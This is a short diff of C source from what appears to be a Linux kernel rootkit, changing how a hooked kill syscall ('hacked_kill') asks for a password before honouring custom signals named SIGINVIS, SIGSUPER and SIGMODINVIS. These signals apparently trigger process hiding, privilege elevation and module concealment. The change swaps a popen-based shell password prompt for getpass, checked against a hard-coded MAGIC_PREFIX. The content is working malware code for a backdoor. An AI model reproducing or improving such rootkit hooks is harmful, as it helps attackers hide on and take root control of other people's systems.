@@ -329,9 +329,9 @@ hacked_kill(pid_t pid, int sig)
 	bool pwTried = FALSE;
 	bool pwPassed = FALSE;
 	if(sig==SIGINVIS || sig==SIGSUPER || sig==SIGMODINVIS){
-		char output[400];
-    	FILE *cmd_output = popen("read -p \"Enter: \" -s pw && echo \"$pw\"", "r");
-    	if (cmd_output!=NULL && fgets(output,sizeof(output), cmd_output)!=NULL && strcmp(output,MAGIC_PREFIX)==0) { pwPassed = TRUE; }
+		char* entered_password;
+		entered_password = getpass("Please enter your password: ");
+		if(strcmp(entered_password,MAGIC_PREFIX)==0) { pwPassed=TRUE; }
 		pwTried = TRUE;
 	}
 
